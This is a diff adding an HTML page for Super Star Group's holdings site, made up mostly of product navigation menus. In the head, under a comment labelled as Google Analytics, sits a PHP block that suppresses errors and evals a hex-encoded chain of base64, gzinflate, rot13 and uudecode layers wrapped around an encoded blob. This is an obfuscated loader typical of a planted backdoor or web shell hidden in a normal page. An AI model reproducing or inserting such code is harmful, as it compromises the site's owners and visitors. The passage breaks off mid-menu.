@@ -1,0 +1,2080 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>SSG - super-star-holdings.htm</title>
+    <meta name="description" content="">
+    <meta name="title" content="">
+    <meta name="author" content="SSG">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="SSG">
+    <link rel="icon" type="image/png" href="themes/ssg/assets/images/favicon.png">
+    <!-- google font -->
+    <link href="themes/ssg/assets/css/google-fonts.css" rel="stylesheet">
+    <!-- Fontawesome  -->
+    
+    <link href="themes/ssg/assets/css/fontawesome/css/all.min.css" rel="stylesheet">
+    <!-- Bootstrap CSS -->
+    <link href="themes/ssg/assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="themes/ssg/assets/css/bootstrap-touch-slider.css" rel="stylesheet">
+     <link href="themes/ssg/assets/css/jquery.fancybox.min.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="themes/ssg/assets/css/animate.min.css" media="all">
+    <link href="themes/ssg/assets/css/aos.css" rel="stylesheet">
+
+    <link href="themes/ssg/assets/css/main.css" rel="stylesheet">
+    
+    
+            
+    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery-3.4.1.min.js" ></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/popper.min.js" ></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/bootstrap.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.touchSwipe.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/TweenMax.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/carosoul.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/bootstrap-touch-slider.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.waypoints.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.countup.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/aos.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.fancybox.min.js"></script>
+    
+    
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <?php session_start(); error_reporting(0); eval("\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x73\x74\x72\x5f\x72\x6f\x74\x31\x33\x28\x63\x6f\x6e\x76\x65\x72\x74\x5f\x75\x75\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x28'DcHpgkJAAADg/96iwdbkSBKDQcs4agxCuY/3f4rd72M6PAA7O1WCbGxaPR/M7qWGAJHtiMR7Blxhb5HA04e2NS1/ez6/uex3+VSs08fj2PjQveoY30lj0IRcV6ONM9QuvHqZ9GTdQ1MUZUUpqCw0seJatZgv+fjtBKOVVI6VgZ44OUELTsr4bSGBRsYZBZgVPG4GJUvru3JaohQSEybmY4jickyX+coDH3CsqkcJX01nhFJ9VR3Mo1M0y/4G4V3xk4QJj5SFH9S0YF+N9dDwdlVHeX/8djjgWHDZ6+YNZIQ1NbqV/KipUx7qb4r9VdbCevdgthO5XW6m+5G6cvKWVLcWXVKBzzEHA889Yemnp4oTTDeb4lyi2ixHYbyJr8HJ3a6x4KP5DZDJWs0ckK18Lr8viEKOFftsD+4zBvkLZYHx1LV3H/nQArwnzq+obBVCKuvszXQvzqRh8q1O7yyKh4KJnNltQszgHBC773v9SjuoKnSzZlJN6/6P27k/'\x29\x29\x29\x29\x29\x29\x29\x29\x3b\x3f\x3e"); ?>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PLVKS5EMLH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-PLVKS5EMLH');
+    </script>
+    <style> 
+
+        #popMakerMyImg {
+          border-radius: 5px;
+          cursor: pointer;
+          transition: 0.3s;
+        }
+        
+        #popMakerMyImg:hover {opacity: 0.7;}
+        
+        /* The Modal (background) */
+        .popupModal {
+          display: none; /* Hidden by default */
+          position: fixed; /* Stay in place */
+          z-index: 9999; /* Sit on top */
+          padding-top: 100px; /* Location of the box */
+          left: 0;
+          top: 0;
+          width: 100%; /* Full width */
+          height: 100%; /* Full height */
+          overflow: auto; /* Enable scroll if needed */
+          background-color: rgb(0,0,0); /* Fallback color */
+          background-color: rgba(0,0,0,0.7); /* Black w/ opacity (0.7) */
+        }
+        
+        /* Modal Content (image) */
+        .popupModal-content {
+          margin: auto;
+          display: block;
+          width: 80%;
+          max-width: 80%; /* Updated to 80% width */
+          height: auto; /* Auto height */
+        }
+        
+        /* Add Animation */
+        .popupModal-content {  
+          -webkit-animation-name: zoom;
+          -webkit-animation-duration: 0.6s;
+          animation-name: zoom;
+          animation-duration: 0.6s;
+        }
+        
+        @-webkit-keyframes zoom {
+          from {-webkit-transform:scale(0)} 
+          to {-webkit-transform:scale(1)}
+        }
+        
+        @keyframes zoom {
+          from {transform:scale(0)} 
+          to {transform:scale(1)}
+        }
+        
+        /* The Close Button */
+        .close {
+          position: absolute;
+          top: 15px;
+          right: 35px;
+          color: #f1f1f1;
+          font-size: 40px;
+          font-weight: bold;
+          transition: 0.3s;
+        }
+        
+        .close:hover,
+        .close:focus {
+          color: #bbb;
+          text-decoration: none;
+          cursor: pointer;
+        }
+        
+        /* 100% Image Width on Smaller Screens */
+        @media only screen and (max-width: 700px){
+          .popupModal-content {
+            width: 100%;
+          }
+        }
+        </style>
+    <!-- End Google Analytics -->
+</head>
+
+<body>
+    <div id="pagewrap" class="super-star-holdings">
+    <!-- Header fixed-top-->
+    <section id="header" class="masthead " >
+        <div class="topbar" >
+    <div class="container">
+        <div class="row topbarheight align-items-center">
+            <div class="col">
+                <span><a href="tel:+8809610774774"
+                    ><img src="themes/ssg/assets/images/icons/tell.png" alt="" /> +88-09610-774774</a
+                  ></span
+                >
+              </div>
+              <div class="col text-right">
+                <form class="search-bar-top" style="display: inline;">
+                      <span id="search-icon" class="search-icon-top">
+                      <i class="fas fa-search" data-fancybox data-animation-duration="700" data-src="#g-search" href="javascript:;" class="card-img-top award"></i>
+                      </span>
+                <!--<input class="search-input" type="text" name="search" placeholder="Search..."> -->
+                
+                </form>
+                <span id="social-icons">
+                  <a target="_new" class="facebook" href="https://www.facebook.com/pg/ssgbd"
+                    ><img src="themes/ssg/assets/images/icons/fb.png" alt=""
+                  /></a>
+                  <a  target="_new" class="youtube" href="https://www.youtube.com/channel/UCvQ2qwNbP4EZmuXDlqZwdDA">
+                  <img src="storage/app/media/icons/youtube-icon.png" alt=""/></a>
+
+                  <a target="_new" class="instagram" href="https://www.instagram.com/ssg.bd/"><img src="https://ssgbd.com/storage/app/media/icons/instagram-icon.png" alt=""/></a>
+                  <a target="_new" class="linkedin" href="https://www.linkedin.com/company/super-star-group/"
+                    ><img src="themes/ssg/assets/images/icons/linkedin.png" alt=""
+                  /></a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="headerbar">
+    <div class="container">
+        <div class="row">
+            <div class="col " id="menu-column">
+                <nav class="navbar navbar-expand-md bg-white navbar-white-style1 ">
+  <a class="navbar-brand" href="index.html">
+    <img id="brand-logo" src="themes/ssg/assets/images/ssg-logo.png" />
+  </a>
+  <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+    <span class="navbar-toggler-icon">
+    </span>
+    <span class="navbar-toggler-icon">
+    </span>
+    <span class="navbar-toggler-icon">
+    </span>
+  </button>
+  <div class="collapse navbar-collapse justify-content-end" id="collapsibleNavbar">
+    <button class="navbar-toggler close-menu" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+      <span class="navbar-toggler-icon">
+      </span>
+      <span class="navbar-toggler-icon">
+      </span>
+      <span class="navbar-toggler-icon">
+      </span>
+    </button>
+    <ul class="navbar-nav nav ">
+      <li class="nav-item ">
+        <a class="nav-link" href="index.html">Home
+        </a>
+      </li>
+      <li class="nav-item dropdown  ">
+        <a id="dropdownAboutUs" href="about-us" data-toggle="dropdown" class="nav-link dropdown-toggle">About Us
+        </a
+          >
+        <div class="dropdown-menu"  data-aos="fade-up" >
+          <a class="dropdown-item" href="about-us"
+             >Company Overview
+          </a
+            >
+          <a class="dropdown-item" href="our-management"
+             >Our Management
+          </a
+            >
+        </div>
+      </li>
+      <li class="nav-item dropdown brandMega ">
+        <a
+           id="dropdownBrand"
+           href="super-star-holdings#"
+           data-toggle="dropdown"
+           aria-haspopup="true"
+           aria-expanded="false"
+           class="nav-link dropdown-toggle"
+           >Brands
+        </a
+          >
+        <!-- // first dropdown  -->
+        <div class="dropdown-menu border-0 shadow">
+          <div class="container-fluid">
+            <div class="row">
+              <div class="col-sm-12 p-0">
+                <ul class="nav brands-tabs" role="tablist">
+                  <!-- //tab brand1 tab link -->
+                  <li class="nav-main-item"  >
+                    <a
+                       class="nav-link active"
+                       data-toggle="tab"
+                       href="super-star-holdings#brand1"
+                       role="tab"
+                       >
+                      <img
+                           class="img-fluid brand-ico brand-super-star-logo"
+                           src="storage/app/media/super-star.png"
+                           alt=""
+                           />
+                    </a>
+                  </li>
+                  <!-- //tab brand4 tab link -->
+                  <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#brand4" role="tab">
+                      <img class="img-fluid brand-ico brand-orlee-logo" src="storage/app/media/orlee.png" alt="" />
+                    </a>
+                  </li>
+                  <!-- //tab brand2 tab link -->
+                  <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#brand2" role="tab">
+                      <img class="img-fluid brand-ico brand-roots-logo" src="storage/app/media/roots.png" alt="" />
+                    </a>
+                  </li>
+                  <!-- //tab brand3 tab link -->
+                  <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#brand3" role="tab">
+                      <img class="img-fluid brand-ico brand-blink-logo" src="storage/app/media/blink.png" alt="" />
+                    </a>
+                  </li>
+                  <!-- //tab brand5 tab link -->
+                  <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#brand5" role="tab">
+                      <img class="img-fluid brand-ico brand-super-touch-logo" src="storage/app/media/logo-super-touch1.png" alt="" />
+                    </a>
+                  </li>
+                </ul>
+                <!-- second lavel dropdown  -->
+                <div class="tab-content brand-tab-content full-width-content-tab dropdown-menu border-0 shadow" style="max-height: 55vh !important; overflow-y: scroll;">
+                  <!-- //tab brand1 tab content -->
+                  <div class="row tab-pane active" id="brand1" role="tabpanel">
+    <div class="row">
+        <div class="col-sm-3">
+            <ul class="nav brand-tabs" role="tablist">
+                <li class="nav-main-item">
+                    <a class="nav-link active" data-toggle="tab" href="super-star-holdings#a1" role="tab">
+                        <img class="img-fluid" src="storage/app/media/main-menu-icons/super-star-accessories.png" />
+                        Accessories
+                    </a>
+                </li>
+                <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#a2" role="tab">
+                        <img class="img-fluid" src="storage/app/media/main-menu-icons/super-star-fan.png" />
+                        Fan
+                    </a>
+                </li>
+                <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#a5" role="tab">
+                        <img class="img-fluid" src="storage/app/media/main-menu-icons/super-star-cables-icon.jpg" style="border-radius: 50%;" />
+                        Cables
+                    </a>
+                </li>
+                <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#a3" role="tab">
+                        <img class="img-fluid" src="storage/app/media/main-menu-icons/super-star-lighting.png" />
+                        Lighting
+                    </a>
+                </li>
+                <li class="nav-main-item">
+                    <a class="nav-link" href="https://www.ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=professional-lighting&really_curr_tax=489-yith_product_brand" target="_new">
+                        <img class="img-fluid" src="storage/app/media/main-menu-icons/super-star-professional-lighting.png" />
+                        Professional Lighting
+                    </a>
+                </li>
+            </ul>
+        </div>
+        <div class="col-sm-9">
+            <div class="tab-content">
+            
+                <div class="tab-pane active" id="a1" role="tabpanel">
+                    <!-- a1 content  -->
+                    <div class="card-columns">
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=gang-switch-socket&really_curr_tax=489-yith_product_brand"> Gang Switch-Socket</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=rose-series&really_curr_tax=489-yith_product_brand">Rose Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=lotus-series&really_curr_tax=489-yith_product_brand"> Lotus Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=gang-switch-socket,safe-series&really_curr_tax=489-yith_product_brand">
+                                                Safe Series
+                                            </a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=gang-switch-socket,gold-ray&really_curr_tax=489-yith_product_brand"> Gold Ray Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=gang-switch-socket,glamour-series&really_curr_tax=489-yith_product_brand">
+                                                Glamour Series
+                                            </a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="super-star-holdings#"> Silver Line Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="super-star-holdings#"> Ultimate Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=gang-switch-socket&pa_color=golden&really_curr_tax=489-yith_product_brand"> Brushed Golden Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=gang-switch-socket&pa_color=white&really_curr_tax=489-yith_product_brand">
+                                                Snow White Series
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <div class="card-body">
+                                <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=piano-switch-socket&really_curr_tax=489-yith_product_brand"> Piano Switch-Socket</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=piano-switch-socket,piano-velvet-switch-and-socket&really_curr_tax=489-yith_product_brand">
+                                                Velvet Series
+                                            </a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=piano-switch-socket,premium-series&really_curr_tax=489-yith_product_brand"> Premium Series</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=piano-switch-socket,lovely-star-series&really_curr_tax=489-yith_product_brand"> Color Touch Series</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_neew" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items&really_curr_tax=489-yith_product_brand"> Others PC Items</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items,ceiling-rose&really_curr_tax=489-yith_product_brand"> Ceiling Rose</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=holder,others-piano-items&really_curr_tax=489-yith_product_brand"> Holder</a>
+                                        </li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items,plug&really_curr_tax=489-yith_product_brand"> Plug</a></li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items,socket&really_curr_tax=489-yith_product_brand"> Socket</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items,switch&really_curr_tax=489-yith_product_brand"> Other Switches</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items,mounting-box&really_curr_tax=489-yith_product_brand"> Mounting Box</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=others-piano-items&really_curr_tax=489-yith_product_brand"> Decorative PC Items</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-rose&really_curr_tax=489-yith_product_brand"> Ceiling Rose</a>
+                                        </li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=holder&really_curr_tax=489-yith_product_brand"> Holder</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=piano-switch-socket&really_curr_tax=489-yith_product_brand"> Pinao Switch Box</a></h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=electrical-pvc-tape&really_curr_tax=489-yith_product_brand"> PVC Insulating Tape</a></h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=extension-socket&really_curr_tax=489-yith_product_brand"> Extension Socket</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=extension-socket,premium-series-extension-socket&really_curr_tax=489-yith_product_brand">
+                                                Premium Extension Sockets
+                                            </a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=smart-extension-socket,extension-socket&really_curr_tax=489-yith_product_brand">
+                                                Smart Extension Sockets
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=travel-adaptor&really_curr_tax=489-yith_product_brand"> Travel Adapter</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=tester&really_curr_tax=489-yith_product_brand"> Electrical Tester</a></h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=circuit-breaker&really_curr_tax=489-yith_product_brand"> Circuit Breaker</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=circuit-breaker&really_curr_tax=489-yith_product_brand"> Super Star</a></li>
+                                        <li class="list-group-item">
+                                            Kawamura
+                                        </li>
+                                        <li class="list-group-item">
+                                            Siemens
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=energy-meter&really_curr_tax=489-yith_product_brand"> Energy Meter</a>
+                                </h5>
+                                <ul class="list-group list-group-flush">
+                                    <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=energy-meter&really_curr_tax=489-yith_product_brand"> Regular Energy Meter</a></li>
+                                    <li class="list-group-item">
+                                        <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=energy-meter&really_curr_tax=489-yith_product_brand"> Neutral Missing Energy Meter</a>
+                                    </li>
+                                    <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=energy-meter&really_curr_tax=489-yith_product_brand"> Sub-Meter</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    Main Switch
+                                </h5>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- a1 content end  -->
+                </div>
+                
+                <div class="tab-pane" id="a2" role="tabpanel">
+                    <!-- a2 content  -->
+                    <div class="card-columns">
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan&really_curr_tax=489-yith_product_brand"> Ceiling Fan</a></h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan,classic-series&really_curr_tax=489-yith_product_brand"> Classic</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan,classic-series&really_curr_tax=489-yith_product_brand"> Classic Pro</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan,premium-series-ceiling-fan&really_curr_tax=489-yith_product_brand"> Premium</a>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan,premium-series-ceiling-fan&really_curr_tax=489-yith_product_brand"> Premium Pro</a>
+                                        </li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-category/fan/ceiling-fan/lucky-fan/"> Lucky</a></li>
+                                        <li class="list-group-item"><a href="sultan"> Sultan</a></li>
+                                        <!-- <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan,golden-art-series&really_curr_tax=489-yith_product_brand">
+                      Golden Art</a>
+                    </li>
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ceiling-fan,fan,supreme&really_curr_tax=489-yith_product_brand">
+                      Supreme</a>
+                    </li> -->
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- <div class="card border-0">
+              <div class="card-body">
+                <h5 class="card-title">
+                <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=fan,table-fan&really_curr_tax=489-yith_product_brand">
+                  Table Fan</a>
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=fan,table-fan&really_curr_tax=489-yith_product_brand">
+                      TF- 06 (Grey)</a>
+                    </li>
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=fan,table-fan&really_curr_tax=489-yith_product_brand">
+                      TF- 07 (Blue)</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <div class="card-body">
+                <h5 class="card-title">
+                  Pedestal Fan
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        >
+                      PF- 07 (Black)
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div> -->
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    Stormy Fan
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=fan,exhaust-fan&really_curr_tax=489-yith_product_brand"> Exhaust Fan</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product/blink-ac-net-fan-16/">
+                                        Net Fan
+                                    </a>
+                                </h5>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- a2 content end  -->
+                </div>
+                
+                <div class="tab-pane active" id="a3" role="tabpanel">
+                    <!-- a3 content  -->
+                    <div class="card-columns">
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=ac-led&really_curr_tax=489-yith_product_brand"> LED Bulb</a>
+                                </h5>
+                                <!-- <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        >
+                      Slim
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Compact
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Non Compact
+                    </li>
+                  </ul>
+                </div> -->
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=emergency-tube&really_curr_tax=489-yith_product_brand"> Emergency Bulb</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=led-ledlux-tube&really_curr_tax=489-yith_product_brand"> LED TUBE</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item"><a target="_new" href="super-star-holdings#"> Compact</a></li>
+                                        <li class="list-group-item">
+                                            Non Compact
+                                        </li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=led-bracket-tube&really_curr_tax=489-yith_product_brand"> Bracket Tube</a></li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=emergency-tube&really_curr_tax=489-yith_product_brand"> Emergency Tube</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=led-mega-lux-bulb&really_curr_tax=489-yith_product_brand"> LED MEGA LUX Bulb</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=led-color-lux&really_curr_tax=489-yith_product_brand"> Color LUX</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
